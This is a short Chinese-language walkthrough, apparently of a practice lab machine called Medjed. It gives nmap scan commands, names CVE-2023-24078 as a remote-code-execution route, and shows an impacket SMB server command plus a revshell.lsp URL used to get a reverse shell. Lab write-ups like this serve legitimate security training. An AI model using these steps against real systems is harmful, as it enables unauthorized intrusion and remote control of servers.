针对目标服务器进行相应的端口探测

```
sudo nmap -p- -vvv --min-rate 10000 192.168.128.127 --open
```

![image-20241214160055229](https://s2.loli.net/2024/12/14/Z1wOJmKTU7C5G6I.png)

针对目标服务器开放的端口进行相应的服务探测

```
sudo nmap -p135,139,445,3306,5040,8000,30021,33033,44330,45332,45443,49664,49665,49666,49667,49668,49669 -A -sV 192.168.128.127 -oN Medjed.txt
```

![image-20241214160927656](https://s2.loli.net/2024/12/14/NTEdlphCLXZ7ro8.png)

同时根据相应的版本信息搜索是否存在可以利用的漏洞信息，貌似找到了一个CVE-2023-24078的漏洞可以进行RCE，我们进行尝试

![image-20241214165701078](https://s2.loli.net/2024/12/14/mAsG6gkWlV5pBHv.png)

我们最后尝试使用了这个方法该项目的方法（https://github.com/the-emmons/lsp-reverse-shell）手动上传lua脚本，进行shell反弹

```
sudo impacket-smbserver SMB . -comment share -ts -debug -smb2support -username user -password 'pass'
http://192.168.128.127:8000/revshell.lsp
```
